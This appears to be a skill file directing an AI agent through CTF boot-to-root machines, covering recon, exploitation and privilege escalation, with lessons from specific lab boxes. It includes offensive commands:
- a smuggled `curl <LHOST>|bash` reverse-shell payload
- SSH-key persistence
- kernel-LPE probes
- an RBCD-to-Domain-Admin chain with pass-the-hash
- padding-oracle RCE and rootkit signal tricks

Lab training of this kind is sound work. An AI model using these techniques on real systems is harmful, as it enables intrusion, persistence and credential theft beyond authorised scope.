---
name: ctf-box
description: Boot-to-root methodology for a full machine (THM/HTB/PG/CTF box, "get user.txt+root.txt", "root the box", "foothold to root"). Enforces basic-tool recon (nmap, nc, ffuf, nuclei, dig) before anything custom, wiki-first lookups, and ALWAYS pspy + linpeas/winpeas for privesc. Use when handed a box/IP to own end-to-end.
---

# CTF / Boot-to-Root Box

Own a whole machine: recon -> service triage -> foothold -> user.txt -> privesc -> root.txt.
**Run everything from the engagement tooling host (e.g. Kali in tmux), capture into `targets/<eng>/`.**

Track progress in `targets/<eng>/killchain.md` -- work the current phase's open items, mark `[x]` as each
lands; honor GATE 1 (no hand-rolled exploit before its wiki item is `[x]`), GATE 2 (no exploit step `[x]`
without a `poc/` image), GATE 3 (exhausted vector -> `[!]` + one `Deadends.md` line, never re-run it).

## Standing mandate: Wiki-first, tools-before-scripts (GATE 1, all phases)

This mandate stands over every phase below. Before writing ANY custom script or recalling an exploit from memory:
1. `qmd_query "<tech/version> exploit"` and `qmd_query "<service> privilege escalation"` via wiki-search MCP. Read matches. If the MCP is down (it drops mid-session), run `bash scripts/wiki-query.sh "<tech> exploit"` (same qmd index; `-k` for an exact CVE) - do NOT skip wiki-first or fall back to grep.
2. Pull payloads from `wiki/payloads/` and chains from `wiki/cheatsheets/attack-chains.md` + `wiki/cheatsheets/cve-arsenal.md`, or `Skill(arsenal)` to resolve the exact file.
3. Privesc reference: `wiki/techniques/linux/linux-privesc.md` / `wiki/cheatsheets/linux-privesc.md` (or windows-privesc).
Only after the wiki has nothing do you write a custom PoC. Do not reinvent what the wiki already documents.

**Tooling home:** check `/opt/arsenal` first for pspy/linpeas/shot/capture. pspy64/linpeas/winPEAS live in `/opt/arsenal`, seeded by `vm-provision.sh` from their GitHub releases; our own helpers (`shot.py`, `capture.sh`) are pushed on demand by `bash scripts/vm-sync.sh <name>` from the vault.

**Anti-pattern:** a raw one-shot `bash /root/vm.sh '<exploit>'` (or an inline `node -e`/`python3 -c` payload through it) for a listener, shell, or chained exploit is the smell this mandate exists to catch -- it skips wiki-first and leaves no session to capture. Run persistent/interactive steps in their own named tmux tab instead: `scripts/vm-scan.sh <eng> <target> '<cmd>'`.

## Phase 1 Recon: basic tools only (in this order)

Use the standard toolkit. Do NOT hand-roll recon scripts.

Tooling-first: use rustscan/nmap/feroxbuster/ffuf/nuclei/nxc - never hand-roll a /dev/tcp port loop or a curl fuzz loop (weaker, skips the fingerprint router). **feroxbuster is the DEFAULT web content-discovery tool** (recursive, faster, finds nested paths ffuf/big.txt miss) - launch it the moment nmap shows a web port; keep ffuf for param-mining + vhosts.

**Card EVERY scan tab AS it finishes (before exploiting), not at the end of the box:** `scripts/capture.sh recon <eng> <slug> <tab>` renders the tmux tab into `recon/`. Do this for rustscan, nmap, feroxbuster, ffuf, nuclei, AND whatweb (run whatweb in its OWN tab so it can be carded) - even an empty/unhelpful result gets a card, so the operator can see exactly what ran. `<tab>` = the `@id` or sanitized name `vm-scan.sh` printed. (`status.py` surfaces the recon-card count; 0 cards on a web box = you skipped this.)

Run each scan in its own tmux tab on the VM (root, persistent, survives a dropped `vm.sh` call). **ONE tmux session per engagement (the `<eng>` name); one WINDOW per parallel scan.** Parallel scans on the SAME host collide if they share a window name (the target), so give each its own window with `--win <tool>`: `bash scripts/vm-scan.sh <eng> <target> '<scan>'` for the first, then `bash scripts/vm-scan.sh --win nuclei <eng> <target> 'nuclei ...'`, `--win ferox`, `--win whatweb`, ... **NEVER bump the session name (`<eng>-nuclei`, `<eng>-ferox`) to dodge a collision** - that scatters tabs across many sessions and breaks single-session recon (recurring drift). (multi-web target -> `--win <ip-or-domain>` per host.) Screenshot a live/finished tab with `Skill(screenshot)` `--tmux <eng>:<tab>` (use the `@NN` id or sanitized tab name `vm-scan.sh` prints, not a dotted target). The scan commands below are what you launch inside each tab.

**vm.sh drops long FOREGROUND commands (exit 255, no output).** A single `bash /root/vm.sh '<cmd>'` that runs more than ~2 min (scan / crack / spray / brute loop) gets its SSH cut mid-run. Run ANY long task DETACHED and poll a file: a tmux tab (`vm-scan.sh`), or `nohup <cmd> >/tmp/out 2>&1 & ` then poll `for i in $(seq 1 60); do grep -q DONE /tmp/out && break; sleep 3; done`. Never block one vm.sh call on a slow task. Stdin is NOT forwarded through vm.sh either - push files by base64-into-the-command (`echo <b64> | base64 -d > ~/file`), and write+run in ONE call to avoid a race.

```bash
T=<ip>
# rustscan FIRST (board step 1: fast full-port sweep), THEN nmap -sCV on the open ports it prints.
rustscan -a $T --ulimit 5000 -g                        # seconds -> open-port CSV (e.g. [22,80])
nmap -p<found> -sCV -Pn $T -oN nmap-svc.txt            # version/script scan on rustscan's hits
nmap -p- --min-rate 2000 -T4 -Pn $T -oN nmap-all.txt   # full-TCP confirm (its own tmux tab)
nc -nv $T <port>                 # manual banner / custom-proto services (chatbots, etc.)
dig any @$T <domain>; dig axfr @$T <domain>   # DNS if 53 open / vhost hints
# SMB (445 open) -> netexec (nxc), NOT a one-shot smbclient: nxc fires the fingerprint router,
# enumerates shares+users+policy in one carded pass, and works for standalone Samba AND AD. Run it
# in its OWN tmux tab so it gets a recon card (smbclient leaves no shot):
nxc smb $T -u '' -p '' --shares                 # anon/null share list + signing/OS banner
nxc smb $T -u 'guest' -p '' --shares --rid-brute   # guest fallback + user enum via RID cycling
smbclient -N //$T/<share> -c 'recurse;ls'       # then use smbclient ONLY to pull a specific file/share
# --- WEB SERVICE FOUND -> do ALL of this; do NOT skip web enum to jump to the "obvious" path (password-audit box lesson):
#  (a) CAPTURE IT AS-IS FIRST, before poking: render the page (`capture.sh web <eng> <slug> http://T:PORT/`
#      -> a browser shot with the URL bar) AND save the raw HTML source to poc/ (the site as it was) --
#      curl -s http://T:PORT/ > poc/<slug>-source.html. `web` renders; `ev`/`req` card a request/response.
#      Do this for EVERY distinct web surface you open AS you first explore it, not at close-out:
#      login pages, dashboards, AND the OSINT/social/support apps (a fake-social feed, a profile
#      page, an admin panel). A box with web ports and 0 page renders / no OSINT-app render = you
#      skipped this (recurring miss). For an authed/JS-gated view, render with the session
#      (shot.py --html on the curl'd authed response, or force the gated element visible).
#  (a2) READ FULL, don't just grep. When you fetch a file/response (source, a config, an HLS/media
#      manifest, a JSON body, a JS bundle) READ IT END-TO-END before moving on -- the one line that
#      is the vuln (a hidden `/v1/ingest/*` endpoint in an `#EXT-X-SESSION-DATA` manifest header, a
#      commented creds line, an alternate route) is exactly what a narrow `grep <keyword>` skips.
#      grep to LOCATE in a huge file, then read the surrounding block; never let grep BE the read.
#  (a3) EXPLOIT REQUESTS -> BURP, not just curl. curl is fine for quick loops, but push every
#      LOAD-BEARING request (SSRF, LFI, SQLi/injection, an auth/BFLA bypass, a deser payload, the
#      flag-returning request) into Burp Repeater via `Skill(hunt-burp)` so the operator can replay
#      it, and card it with `scripts/capture.sh burp` / `Skill(screenshot-burp)`. On a breakthrough,
#      the exploit request belongs in Repeater with a Burp screenshot, not only a terminal curl.
#  (c) SOURCE-READ PRIMITIVE first (LFI / file-disclosure / .git / exposed backup): the MOMENT you can
#      read files, READ ALL THE APP SOURCE (every .php feroxbuster finds), fully, BEFORE attacking a
#      login or brute-forcing a DB/panel. The real vuln - a SQLi param, a hardcoded cred, a logic flaw,
#      the flag path - is almost always IN the source you can already read. Grinding phpMyAdmin/creds
#      while an unread `?search=` SQLi sits in dashboard.php source is the recurring "drift to manual".
#  (d) READ THE CLIENT-SIDE JS + SNIPPET WHAT IT REVEALS. Pull every app.js / bundle / inline <script> /
#      source map and grep it for `fetch(`/`axios`/`XMLHttpRequest`/`/api`/`token`/`secret`/`key`/`admin`.
#      For a JS/SPA front-end the API is NOT reachable by feroxbuster/ffuf: POST-only JSON routes 404 on
#      the scanners' GET, and a bare `/api` 404s so `-d 2` never recurses into it - so the JS bundle IS
#      the endpoint map (this box: the whole /api/* surface + the reward-gate came only from app.js; the
#      ferox card was empty). MANDATE: the MOMENT source (JS/HTML/config/source map) reveals something
#      load-bearing - an endpoint, a secret/key, a hidden route, a client-side gate/validation - SNIPPET
#      IT: `scripts/capture.sh snippet <eng> <slug> <url-or-file> '<grep-pattern>' '<what it reveals>'`
#      writes poc/NN-<slug>-snippet.md (fenced excerpt + reveals note), then PASTE that fenced block
#      inline into walkthrough.md Recon. Never leave a source finding as ephemeral chat - the snippet is
#      the recon artifact the empty ferox/nuclei card cannot be.
#  (b) LAUNCH THE SCANNERS IN PARALLEL the MOMENT nmap shows a web port -- ONE tmux tab each, do not wait serially:
#        feroxbuster (PRIMARY dir/file discovery), nuclei (CVE/misconfig), whatweb (fingerprint, its OWN tab):
#        scripts/vm-scan.sh --win ferox <eng> $T 'feroxbuster ...' ; --win nuclei <eng> $T 'nuclei -u http://$T' ; --win whatweb <eng> $T 'whatweb -a3 http://$T'  (ONE session, a window each)
#      Analyse the page/source WHILE they run, then CARD each tab (feroxbuster + whatweb + nuclei) when it finishes.
#      NEVER conclude "no web vuln / no hidden route" until feroxbuster AND nuclei have actually run AND been read.
# Web (per http port) -- the scans you launch in those tmux tabs:
# PRIMARY dir/file discovery = feroxbuster (recursive; run FIRST, with backup/log exts). base64-push harness-paths.txt to the VM first.
feroxbuster -u http://$T -w /tmp/harness-paths.txt -x php,txt,log,sql,bak,zip,env,old,conf -d 2 --no-state -o ferox.txt   # OUR high-signal list, recursive
feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,log,bak -d 2 --no-state   # then the BIG list (raft-large; fallback raft-medium-words or /usr/share/wordlists/dirb/big.txt)
# ffuf for what feroxbuster does NOT do -- param mining + vhosts:
ffuf -c -u "http://$T/?FUZZ=x" -w scripts/wordlists/harness-params.txt -fs <baseline>          # param mining (SSRF/LFI/cmdi names); -c = colored output (readable recon card)
ffuf -c -u http://$T/ -H "Host: FUZZ.$T" -w <vhost-wordlist> -ac                                # vhosts
nuclei -u http://$T -o nuclei.txt                                                              # known CVEs/misconfig
whatweb -a3 http://$T ; curl -s -I http://$T                                                   # fingerprint + cookies (whatweb in its OWN tmux tab -> recon card)
wpscan -u http://$T                                                                            # If there is a wordpress
```
**Wordlists live on the attacker box, not always on the scan VM.** `scripts/wordlists/*` (vault path)
and `/usr/share/seclists/*` may NOT exist on the VM you run ffuf from. A missing `-w` makes ffuf
print its **help text and silently find NOTHING** - a false "no hidden endpoints / no LFI param"
that once cost a whole box (concluded the app had no vuln when the fuzzer never ran). Preflight every
fuzz: `ls "$W" || W=/usr/share/wordlists/dirb/big.txt`. seclists is often absent (stock Kali without
the `seclists` package has only `/usr/share/wordlists/dirb/*`); push the harness lists to the VM
(`base64` them over to `/tmp/`) before using `scripts/wordlists/harness-*.txt`.

Fingerprint the exact app + version. **On any fingerprinted surface/service, `Skill(arsenal)` FIRST**: it maps the surface to the automated tools we already document in `wiki/tools/` (web -> httpx/ffuf/feroxbuster/nuclei/dalfox/wpscan; SMB/AD -> netexec/bloodhound; login -> hydra/hashcat; ...) so you use OUR tool for the service instead of hand-rolling, THEN the technique/payload (`wiki/payloads` + the matching hunt skill). Then hand web vulns to the matching hunt skill (sqli/ssrf/upload/...) via triggers. Screenshot each finding AS it lands (`Skill(screenshot)`), not at the end. **OT/ICS ports (502 Modbus / 102 S7 / 44818 EtherNet/IP / 1880 Node-RED / an HMI web app) -> `Skill(hunt-ics)`** (drive the plant to a danger state; the flag is often a visual overlay in the HMI/CCTV media).

## Phase 2 Weaponize: pick the exploit

- Map version -> `searchsploit <app> <ver>` and the wiki CVE lookup ([[cve-arsenal]]); prefer the documented PoC over a fresh one.
- Pick the payload set from `wiki/payloads/` for the fingerprinted class (GATE 1: the wiki item is `[x]` before you hand-roll a PoC).
- Stage the chosen exploit/PoC into `targets/<eng>/poc/scripts/` before firing, so the code and the run are captured together.

## Phase 3 Deliver: land a shell

- Deliver the staged payload/exploit against the target; prefer the documented PoC over a fresh one.
- Get a stable shell early: upgrade to PTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient session.
- **Cred-reuse FIRST.** Capture creds to `targets/<eng>/loot.md` immediately; try reuse (su / ssh / other services) BEFORE hunting new ones. DB/web creds are very often **reused for SSH**.

## Phase 4 Exploit: finish the foothold, then privesc

**STOP-and-think the moment ANY shell lands (before reaching for a shortcut).** The recurring
failure is following the FASTEST path instead of the INTENDED one, then going off the rails. Pause and:
1. Read the box's THEME/name + any notes/creds/files you already have - CTF boxes telegraph the
   intended vector (a module lesson, a service left on, a labelled secret). `qmd_query` the wiki for
   that theme + the exact fingerprinted tech before acting.
2. Enumerate the INTENDED escalation surface FIRST: `sudo -l`, writable configs/cron/timers/scripts
   you own, group memberships, service creds - the deliberate path is almost always one of these and
   `pspy`/`linpeas` surface it in seconds.
3. **Kernel-LPE arsenal (dirtyfrag/copyfail/PwnKit/...) is a LABELLED FALLBACK, not the opening move.**
   We DO carry instant-escalation payloads for old kernels ([[privesc-exploit-arsenal]], [[dirty-frag]]) -
   note the `uname -r` band as a fallback, but VERIFY the intended path is genuinely absent AND verify
   the CVE precondition (userns/module/patch-band) before firing. A shortcut that works is fine; taking
   it BEFORE checking the taught vector is the drift. Once you have full root, look back at what was
   INTENDED and record it (walkthrough + Deadends), so the fast win still teaches the lesson.

Finish the foothold first (leftover Rule 2 techniques, if the shell landed mid-app):
- **Consistent escalation primitive:** if a box exposes the SAME pivot at each stage (a Docker socket/TLS pivot per level, an SSRF each hop), verify/exhaust that intended vector end-to-end BEFORE an opportunistic shortcut (raw device mount, a memory CVE). A shortcut that relies on `--privileged`/a loose cap can mask that a hardened config would block it, and it is less reproducible/auditable. Getting the flag via a shortcut is fine; SKIPPING the taught vector without testing it is the miss.
- Web SQLi: in-band (UNION/error) before blind; test EVERY quote context (`'` `"` numeric) and second-order (a stored value used unsafely on another page). If the app hashes the password inside the query, read plaintext from `information_schema.PROCESSLIST`. Load `Skill(hunt-sqli)` / see [[sql-injection]].
- Recovered unsalted MD5/SHA1: **online lookup first** (CrackStation/hashes.com) before hashcat/john. A hash that resists everything on a hard box may be a deliberate decoy; pivot, don't grind.

Then privesc = pspy ALWAYS + linpeas/winpeas, then manual.

**Always run pspy first** to catch root-run background jobs/cron/timers that static checks miss:
```bash
# upload pspy64 (host it on the tooling box, curl/wget it down) and watch >=60s
./pspy64 -pf -i 1000     # see every exec + file event as root; reveals per-minute cron/systemd timers
```
Then the automated sweep:
```bash
./linpeas.sh         # linux   (winpeas.exe / winpeas.bat on windows)
# AVOID `-a` (deep/thorough) on small boxes (<=1-2 GB RAM, most THM VMs): the full scan can
# OOM-thrash the target until every service (ssh/http/db) times out - looks exactly like the box
# crashed. Use the default scan, or throttle: `nice -n19 ionice -c3 ./linpeas.sh`. If it does hang
# the box, `pkill -9 -f linpeas` (kill it as the user that launched it) and load drains in seconds.
```
Capture linpeas/pspy TWO ways: a `--term` screenshot of the highlighted findings (Skill(screenshot),
the colored hits survive) AND the FULL text log - redirect the tool to a file, then
`scripts/capture.sh log <eng> <slug> /tmp/linpeas.txt` pulls the whole scan (ANSI stripped) into
`poc/NN-<slug>.md`. The screenshot is unreadable past one screen; the `.md` keeps every line so you
(and the operator) can grep it later. Do this for full nmap output too when it is long.

Then walk the manual checklist (do not skip any; the box's intended path is usually ONE of these):

| Check | Command | Win = |
|---|---|---|
| sudo rights | `sudo -l` | NOPASSWD/GTFObin -> root |
| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFObins |
| Capabilities | `getcap -r / 2>/dev/null` | cap_setuid etc. |
| Cron | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script |
| **systemd timers** | `systemctl list-timers --all` + `systemctl cat <svc>` | **writable ExecStart script run as root** (e.g. THM Ollie `feedme.timer`) |
| Writable root files | writable scripts/units root executes; `/etc/passwd` writable | inject payload, wait for trigger |
| Groups | `id` (docker/lxd/disk/adm/shadow) | group->root GTFO |
| Creds | configs, history, DB, `.ssh`, backups | reuse / su |
| Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first (see lesson) |

## Lesson: verify exploit preconditions before firing (THM Ollie)

Intended path was PwnKit (CVE-2021-4034) but the box was kernel-patched:
- **PwnKit dead** on kernels with the `argc==0` mitigation (5.x+); pkexec prints usage, GCONV_PATH never injects.
- **CVE-2021-3560** dead once polkit >= 0.105-26ubuntu1.1 (race returns PermissionDenied in ~9ms).
- **Nimbuspwn** needs to own `org.freedesktop.network1` (dbus policy usually = systemd-network only).
- The real path was a **writable root systemd timer** (`feedme`) firing every minute - which **pspy/linpeas surface in seconds**. Run them first; treat kernel CVEs as the last resort and check `uname -r` + package patch level before burning time.

**Kernel-CVE reflex = wiki-first, not memory.** When you DO reach for a kernel LPE, open
[[privesc-exploit-arsenal]] FIRST (I once defaulted to stale public-CVE memory and dismissed a
viable path). Match the exact `uname -r` band, then VERIFY the precondition before firing (module
loadable / address-family reachable / unprivileged userns). The Tinoco 2026 page-cache set
(copyfail/dirtyfrag/peditcow/... CVE-2026-*) spans 4.14->7.x and is unpatched on most pre-2026
boxes. **Lab-confirmed:** copyfail CVE-2026-31431 roots a 5.4.0-173 box from a low-priv user
(probe `socket.socket(38,SOCK_SEQPACKET).bind(("aead","authencesn(hmac(sha256),cbc(aes))"))` - if it
binds, reachable; port the PoC's `os.splice` -> `ctypes` `syscall(275,...)` on Python 3.8; restore a
poisoned file with root `echo 3 > /proc/sys/vm/drop_caches`). On a THM/HTB box you own, testing the
arsenal end-to-end is fair game.

## Lesson: LKM-rootkit privesc via sudo insmod - read the magic signal, don't trust the default (THM Athena)

`sudo -l` showing `(root) NOPASSWD: /usr/sbin/insmod /path/rootkit.ko` is a ROOT primitive: the
allowed module is a pre-built LKM rootkit (e.g. m0nad **Diamorphine**) - load it, then trigger its
give-root magic signal. This is DISTINCT from CAP_SYS_MODULE (there you build your own module); here
the module is fixed and you drive it by signal. Two gotchas that cost real time:
- **The magic signal may be recompiled.** Diamorphine defaults are `kill -64 0` (root), `-63` (hide
  proc), `-31` (hide module) - but the author can change them, and the default then silently does
  nothing. Don't fire it from memory. The module is usually **not stripped**, so READ the real one:
  `objdump -d rootkit.ko | sed -n '/<hacked_kill>:/,/<module_hide>:/p' | grep cmp` -> the `cmp $0xNN`
  whose branch calls `give_root` is the signal (was `0x39` = 57 here, not 64). Reversing the artifact
  beats guessing the same way `uname -r` + patch-level beats guessing a kernel CVE.
- **A wrong (unhandled) signal kills your shell.** `kill -<sig> 0` targets the whole process group;
  a rootkit only swallows the signals it HANDLES, so an unhandled number is delivered for real and
  drops your session. The correct magic signal is handled (returns 0, no delivery) and is safe. See
  [[linux-privesc]] / [[linux-rootkits]].

## Lesson: mutate leaked/labelled secrets; cookie-BFLA is not session admin (THM Support Panel)

A PHP panel that leaked its own source via an LFI (`readfile`/`highlight_file` of `?skin=../config`):
- **A labelled secret that fails as a literal is a SEED, not always a decoy.** Source leaked
  `$MASTER_PASSWORD='support@110'`; it failed on every login/SSH. The admin's real password was a
  **mutation**: `support@110` -> `support110` (drop the `@`). Mutate leaked/hint values
  (`echo '<seed>' | hashcat --stdout -r best64.rule`, plus manual case/number/suffix/`@`-drop)
  against the real login BEFORE declaring decoy or committing to a full rockyou brute (which gave a
  misleading ~40h ETA and never would have hit it). See [[password-cracking]].
- **A forgeable cookie usually gates only PART of the app.** `isITUser=md5(user.admin?"true":"false")`
  forged to `md5("true")` unlocked the API + IDOR, but the RCE and the flag were gated by
  `$_SESSION['admin']`, set ONLY at a real login. The cookie BFLA was a deliberate distraction.
  Map WHICH check (cookie vs session) gates the thing you actually want before assuming "I'm admin".
- Command sink behind a prefix allowlist (`strpos($cmd,'date')===0`) -> chain off it: `date;<cmd>`.

## Lesson: reverse-proxy smuggling chain + go-for-shell efficiency (THM Contrabando)

Front Apache proxies `/page/(.*)` to a backend; the chain plus the efficiency mistakes worth not repeating:
- **Fuzz behind the proxy.** `ffuf -u http://T/page/FUZZ -e .php -fw <readfile-error-wc>` found `gen.php`, a sink the proxy never routes externally. Find the unrouted endpoint BEFORE reading source.
- **CVE-2023-25690** (Apache <= 2.4.55 `RewriteRule [P]`): raw `%0d%0a` in the captured path splits the proxied request, smuggling a POST to that cmd-injection sink. Exact bytes + gotchas (leading `x`, `%20` ends the request line, `&`->`%26`, exact CL) in [[http-request-smuggling]].
- **Once egress is confirmed, go straight for a reverse shell:** smuggle `length=;curl <LHOST>|bash;` with the payload at web-root `index.html` so the body has NO slashes (dodges the front's literal-`/` 404 and all double-encoding). Do NOT grind blind-RCE-to-file + LFI-read; a real shell makes the downstream brute-force and the python2 trick trivial. The blind `id>%252ftmp%252fo` + LFI-read path is only the no-egress fallback (slow, racy, truncates long commands; for those host a script and smuggle the short `curl <IP>|bash`).
- **No container escape (no docker.sock, CapEff=0, no host mount)? Pivot over the docker network, not out of the container.** `rustscan --top -a 172.18.0.1,172.18.0.2 --accessible` from the container found an internal Flask app on `172.18.0.1:5000`.
- **Internal "fetch a URL" service = SSRF + often SSTI.** It rendered the fetched response via `render_template_string`, so host a Jinja2 template, `website_url=http://<LHOST>/t`, RCE as the app user; `file://` also reads host files. See [[ssti]].
- **Privesc:** sudo `python*` arg-glob picks python2 -> `input()`=`eval()`; an unquoted `[[ == ]]` vault script is a glob oracle leaking the sudo password. See [[linux-privesc]].
- **Orchestration:** if you delegate this box to a background fork, do NOT also exploit it in parallel. A long brute-force makes the fork look idle while it is alive; shared `/tmp` files + app render-caches make your runs and the fork's indistinguishable. Wait for the completion signal or `SendMessage`-ping.

## Lesson: Windows AD box, RDP-only foothold -> KeePass (DPAPI) -> RBCD to DA (THM Forward)

Assumed-breach low-priv domain user; DA via a credential chain (no Linux, no memory-CVE). Load `Skill(hunt-ad)`.
- **RDP-only foothold.** User in **Remote Desktop Users** but NOT local-admin and no WinRM = interactive RDP is
  the only exec path. Drive it HEADLESS from Kali: `Xvfb :99 &` + `DISPLAY=:99 xfreerdp3 /v: /u: /p: /d: /cert:ignore
  /drive:sh,/tmp/share` (FreeRDP 3.x wants `/cert:ignore`, NOT `/cert-ignore`) + `xdotool key super+r` then type
  `cmd /c \\tsclient\sh\run.bat`, with output redirected to the `\\tsclient\sh` drive. Read GUI secrets by SCREENSHOT
  (`import -window root`); the headless clipboard is unreliable (syncs 1 byte). Full recipe in [[ad-lateral-movement]].
- **AppLocker-Restricted user:** a dropped .exe (winPEAS/SharpUp) is blocked - enumerate with built-ins
  (reg/sc/wmic/schtasks/dir), which run from the allowed C:\Windows.
- **KeePass DB (`*.kdbx`) on the box:** if `keepass2john`/pykeepass reject EVERY password, it is not password-locked.
  Check `KeePass.config.xml` KeySources - `<UserAccount>true</UserAccount>` = protected by the **Windows account
  (DPAPI), uncrackable offline**. OPEN it on the box as that user (only "Windows user account" ticked -> OK). Creds
  inside often **REUSE** to a higher-priv account - spray them. See [[password-cracking]].
- **RBCD to DA** once you own an account with `AddAllowedToAct`/GenericWrite on a computer (BloodHound): `addcomputer
  FAKE$` (MAQ>0) -> `rbcd -action write` -> `getST -impersonate Administrator -spn cifs/DC` -> `secretsdump -k`.
- **Reading the flag as DA:** Defender may block `nxc -x`/wmiexec output retrieval - read files directly over SMB with
  PtH (`smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`); no exec = no AV.

## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)

PHP web app on a high port; no memory CVE, the whole box is applied crypto. Load `Skill(hunt-sqli)`/wiki [[cryptography-attacks]].
- **Deobfuscate client JS for secrets.** obfuscator.io-style `api.js` (string-array + rotator) hides an API
  password/key. Don't hand-trace: run the decoder in node -- `node -e "$(cat api.js); console.log(c)"` prints
  the decoded `const`. It gated `api.php`, whose "docs" leaked the token algorithm.
- **Directory listing is the crack.** ffuf found `/logs/` (autoindex) -> `app.log` leaked a valid
  (email, invite_code) pair, the email domain, and which users are active. That one pair breaks the token scheme.
- **Weak `mt_rand` token forge from ONE pair.** Token = `mt_srand(seed(email,CONST)); base64(mt_rand())`. Recover
  the unknown `CONST` offline by bruting until the leaked pair reproduces (PHP 8 cli replicates a PHP 7.x target;
  `mt_rand` is stable 7.1+), then forge any user's code -> login. See [[cryptography-attacks]] PRNG.
- **Encrypted param -> padding-oracle RCE.** A hidden `?date=` blob, re-encrypted each load, decrypted server-side
  and its value RUN as a shell command (output echoed in the footer). The openssl error leaked an **8-byte IV = 64-bit
  cipher, NOT AES** (stop guessing AES keys). App showed a distinct "Padding error" vs clean render = **padding oracle**.
  No padbuster on the VM -> ~60-line Python oracle: decrypt the blob (plaintext was literally `date +%Y` -> confirms the
  `shell_exec` sink), then **CBC-R forge** a blob decrypting to `cat /home/ubuntu/flag.txt` -> RCE, no key. `THM{GOT_COMMAND_EXECUTION001}`.
- **Anti-grind:** guessing the cipher KEY was a dead-end (~130 combos); the padding oracle needs NO key. When an app
  echoes padding validity, reach for the oracle, don't brute keys. Forging (CBC-R) is the payload, not just decryption.

## Lesson: cred-reuse-first, don't blind-scrape a SPA admin, linpeas-not-by-hand (THM Voyage)

Joomla 4.2.7 -> CVE-2023-23752 leaked the DB root password. Chain: cred-reuse -> root SSH on a pivot
container -> internal Flask app pickle-deser RCE -> `cap_sys_module` kmod escape to host root. Three misses:
- **A leaked cred is a REUSE probe before it is a research target.** The DB password was reused for root
  SSH on a second port. Test any leaked/default cred against SSH + every other auth surface FIRST; only
  then commit to a slower web-admin exploit chain. (Rule 2 says this; the miss was ~13 calls blind-scraping
  the admin panel before trying the obvious reuse.)
- **Modern CMS/SPA admin panels are JS-rendered**, so `curl` sees only page chrome (no list rows/ids). Do
  NOT grind a template-editor RCE over `curl` against a Joomla 4 / SPA admin - drive a real browser, or
  (usually) the intended foothold is elsewhere (here: the cred reuse).
- **Privesc = linpeas/pspy FIRST (Rule 3), not hand-rolled `ls`/`find`/`cat`.** The smell is enumerating by
  hand before the automated sweep runs. `cap_sys_module` escape: `capsh --print | grep sys_module` then
  build+`insmod` a module into the host (`call_usermodehelper`); if headers != running kernel, patch the
  `.ko` vermagic to `uname -r` - see [[linux-privesc]].

## Capture (engagement discipline)

After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -> `loot.md`, chain -> `paths.md`, vulns -> `Vuln-index.md`, dead-ends -> `Deadends.md`, narrative -> `log.md`. Flags go in the writeup, never in `session/*` or `wiki/`.

**Live-capture machinery (so evidence is NOT all backfilled at close-out - the recurring miss):**
- **Auto-card of scan tabs is a backstop, still NOT a substitute for judgement.** The Stop hook runs
  `scripts/autocard.sh` SYNCHRONOUSLY-but-BOUNDED each turn (caps to `AUTOCARD_MAX=2` tabs/run +
  per-SSH `timeout`, so it finishes in a few seconds inside the hook window) to render any FINISHED
  scan tmux tab into `recon/` (idempotent via `.carded-tabs`; cards named `auto-<tab>`). This replaced
  the old DETACHED spawn, which was unreliable over the WSL/remote-VM SSH bridge - the grandchild
  often never ran, so cards only appeared in one late batch at close-out. In-hook + capped makes them
  trickle in live and deterministically. It is still only a backstop for SCAN tabs: **hand-card as you
  go remains PRIMARY** for the deliberate exploit shots (Phase 1: `capture.sh recon <eng> <slug> <tab>`
  per tab as it finishes), and **before leaving recon, VERIFY** `ls targets/<eng>/recon/` is non-empty
  (or `status.py`'s recon-card count > 0). 0 cards while scan tabs have finished = something's wrong
  (VM down / `timeout` missing); hand-card them now.
- **You still hand-card the deliberate EXPLOIT-state shots** as they land - the flag in place, the RCE
  firing, a shell, an authed panel - since only judgement knows which moment matters, and persist
  findings to `state.md`/`loot.md`/`paths.md` the moment they land (do not defer to close-out).

**Log each step to `log.md` AS it lands (step 1 -> step 2 -> ...), not at close-out.** The operator follows the box LIVE from `log.md`, so append a line the moment a step works. `log.md` holds the REAL commands - including the messy automation (base64-wrapped scripts, pty `su` helpers, joint one-liners) - so it is reproducible and the operator sees exactly what ran. **`walkthrough.md` is the CLEAN human version:** concrete one-liners a person would type (real IP/host, NO `$VAR`s, NO base64/pty wrappers). If a step needed a script, show the simple human action in the walkthrough (e.g. `su cobra` then type the password) and keep the automation in `log.md` / `poc/scripts/`.

**Read the UI/source hints LITERALLY before fuzzing.** An input `placeholder`, a button label, a referenced `.js`, or leaked source usually tells you the intended input format. (Dodge: the field placeholder said "sudo command parameter" - it wanted `sudo ufw allow <port>`, an allowlist, not injection. Hours were lost fuzzing it as command-injection.)

**Beware locally-substituted payloads = FALSE-POSITIVE RCE (high-severity trap).** A payload containing `$(...)`, backticks, or `$VAR` sent through the VM bridge (or any local shell / a `for p in $(...)` loop) is substituted LOCALLY before it reaches the target - and the tooling VM runs as ROOT, so a reflected `uid=0(root)` may be YOUR OWN box, not the target. ALWAYS single-quote or base64 injection payloads; confirm the target actually executed it with a marker only the target can produce (its hostname, a file only it has). NEVER claim RCE from a reflected `id`/`uid` that matches your attacker host - re-send the exact payload single-quoted and re-check before believing it.

**Preserve exploit scripts and read source.** When you write the exploit script Rule 0 has you fall back to (a payload HTML, an escape/forge script, a webshell) or read a target's source, copy it into `targets/<eng>/poc/scripts/` and card the source with its URL (e.g. `shot.py --term --url-bar`); the reviewer needs the code and the state together, not just a screenshot. **Save it as `<name>.md` with the code in a ```` ```sh ````/```` ```js ````/```` ```py ```` fence, NOT a bare `.sh`/`.js`/`.py`** - Obsidian only previews `.md`/images in the GUI, so a raw-extension script is invisible to the operator. (`capture.sh log` already writes `.md`; saved page source is `-source.md` with an ```` ```html ```` fence for the same reason. For a targeted EXCERPT of source that revealed something, `capture.sh snippet <eng> <slug> <url-or-file> '<grep-pattern>' '<reveals>'` writes a fenced `poc/NN-<slug>-snippet.md` to paste into walkthrough Recon.)

